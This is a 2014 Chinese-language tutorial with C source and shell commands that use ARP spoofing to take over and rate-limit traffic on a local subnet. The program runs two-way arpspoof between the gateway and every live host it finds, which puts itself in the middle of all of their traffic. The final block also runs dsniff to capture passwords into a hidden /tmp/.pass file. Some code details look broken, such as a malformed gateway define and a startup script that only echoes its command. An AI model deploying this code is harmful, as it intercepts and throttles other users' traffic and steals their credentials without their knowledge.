# ARP spoofing 技術管控區網流量實例

\


Aaron Liao, 2014

功能：

1\. 控制區域網路流量

2\. 先使用 arping 檢察現存的 ARP 回應。

需要的工具：

1\. iptables, arping, dsniff

2\. 將 arp\_spoof 新增到 /etc/crontab，用於動態更新 ARP table

/etc/rc.local：

```shell

TEST=`ifconfig|grep 192.168.20.|wc -l`

if [ $TEST -ne 0 ]; then 
    echo $TEST /sbin/arp_spoof;
fi

```



compile:

`$ sudo gcc arp_spoof.c -o /sbin/arp_spoof`



```c
#include <stdio.h>
#include <stdlib.h>
#include <strings.h>
#define dev "eth0"
#define network "192.168.20."
#define subnet "192.168.20.0/24"
#define gw "192.168.20.1"sh

int detect_arp_alive(char *ip);
int init(void);
int set_local_host(void);
int clean_nf(void);

int set_local_host(void) { 
    system("iptables -I INPUT -d 192.168.20.0/24 -p tcp --sport 80 -m limit --limit 100/second -j ACCEPT"); 
    system("iptables -I INPUT -d 192.168.20.0/24 -p tcp --sport 23 -m limit --limit 50/second -j ACCEPT"); 
    system("iptables -I INPUT -d 192.168.20.0/24 -p tcp --sport 21 -m limit --limit 50/second -j ACCEPT"); 
    system("iptables -I INPUT -d 192.168.20.0/24 -p tcp --sport 20 -m limit --limit 50/second -j ACCEPT"); 
    system("iptables -I INPUT -d 192.168.20.0/24 -p udp --sport 53 -m limit --limit 5/second -j ACCEPT"); 
    system("iptables -A INPUT -d 192.168.20.0/24 -m limit --limit 50/second -j ACCEPT"); 
    system("iptables -I INPUT -p tcp --sport 3389 -j ACCEPT"); 
    system("iptables -A INPUT -d 192.168.20.0/24 -j DROP"); 
    system("iptables -I OUTPUT -s 192.168.20.0/24 -m limit --limit 64/second -j ACCEPT"); 
    system("iptables -I OUTPUT -s 192.168.20.0/24 -p udp --dport 53 -m limit --limit 5/second -j ACCEPT"); 
    system("iptables -I OUTPUT -p tcp --dport 3389 -j ACCEPT"); 
    system("iptables -A OUTPUT -s 192.168.20.0/24 -j DROP"); 
    
    return 0;
}

int detect_arp_alive(char *ip) { 
    char cmd[128]; 
    int i, c; 
    bzero(cmd, sizeof(cmd)); 
    
    // change logic from and to or, PS -w sometimes the unit is us, and sometimes is s 
    sprintf(cmd, "arping -c 1 -w 1 -I %s %s 1>/dev/null 2>/dev/null", dev, ip); 
    
    for(i=0, c=0; i<3; i++) { 
        if(system(cmd)==0) 
            return 0; 
        c++; 
    } 
    
    return c;
}

int clean_nf(void) { 
    system("iptables -F INPUT"); 
    system("iptables -F OUTPUT"); 
    system("iptables -F FORWARD"); 
    system("iptables -P INPUT ACCEPT"); 
    system("iptables -P OUTPUT ACCEPT"); 
    system("iptables -P FORWARD ACCEPT"); 
    
    return 0;
}

int init(void) { 
    system("echo '1' > /proc/sys/net/ipv4/ip_forward"); 
    system("/usr/bin/killall -9 arpspoof"); 
    system("sleep 1"); 
    clean_nf(); 
    set_local_host(); 
    return 0;
}

int main(int argc, char *argv[]) { 
    int ret = 0, i; 
    char ip[15], cmd[128]; 
    
    init(); 
    sprintf(cmd, "iptables -A FORWARD -d %s -m limit --limit 100/second -j ACCEPT", subnet); 
    system(cmd); 
    sprintf(cmd, "iptables -A FORWARD -d %s -p tcp --sport 3389 -j ACCEPT", subnet); 
    system(cmd); 
    sprintf(cmd, "iptables -A FORWARD -s %s -m limit --limit 50/second -j ACCEPT", subnet); 
    system(cmd); 
    sprintf(cmd, "iptables -A FORWARD -s %s -j DROP", subnet); 
    system(cmd); sprintf(cmd, "iptables -A FORWARD -d %s -j DROP", subnet); 
    system(cmd); 
    
    for(i=2;i<254;i++) { 
        /* 2 ~ 253 */ 
        bzero(ip, sizeof(ip)); 
        bzero(cmd, sizeof(cmd)); 
        sprintf(ip, "%s%d", network,i); 
        
        if( detect_arp_alive(ip) == 0 ) { 
            /* limit the rate of the ip */ 
            /* Doing arp spoofing */ 
            sprintf(cmd, "arpspoof -t %s%d %s 1>/dev/null 2>/dev/null &", network, i, gw); 
            system(cmd); 
            
            sprintf(cmd, "arpspoof -t %s %s%d 1>/dev/null 2>/dev/null &", gw, network, i); 
            system(cmd); // limit the Download BW 
            
            sprintf(cmd, "iptables -I FORWARD -d %s%d -m limit --limit 64/second -j ACCEPT", network, i); 
            system(cmd); 
            
            sprintf(cmd, "iptables -I FORWARD -d %s%d -p tcp --sport 1:1024 -m limit --limit 100/second -j ACCEPT", network, i); 
            system(cmd); 
            
            sprintf(cmd, "iptables -I FORWARD -d %s%d -p udp -m limit --limit 50/second -j ACCEPT", network, i); 
            system(cmd); // limit the Upload BW 
            sprintf(cmd, "iptables -I FORWARD -s %s%d -m limit --limit 64/second -j ACCEPT", network, i); 
            system(cmd); 
            sprintf(cmd, "iptables -I FORWARD -s %s%d -p udp --dport 53 -m limit --limit 64/second -j ACCEPT", network, i); 
            system(cmd); 
        }
    } 
    
    return 0;
}

```



其它資訊：

<pre class="language-shell"><code class="lang-shell">iptables -A FORWARD -d this_host_IP -j ACCEPT

# Set the host not to response ARP request,
# Other hosts have to previously set static arp list about the MAC of this host theirself.
<strong>echo "8" > /proc/sys/net/ipv4/conf/all/arp_ignore;
</strong>
# enable packet forward
echo "1" > /proc/sys/net/ipv4/ip_forward;

# make ARP spoofing
arpspoof -i eth0 -t this_host_IP gateway &#x26;
arpspoof -i eth0 -t gateway this_host_IP &#x26;
dsniff -i eth0 -w /tmp/.pass &#x26;

# set static ARP
# MAC of the gateway
arp -s gateway (MAC of gateway)
</code></pre>

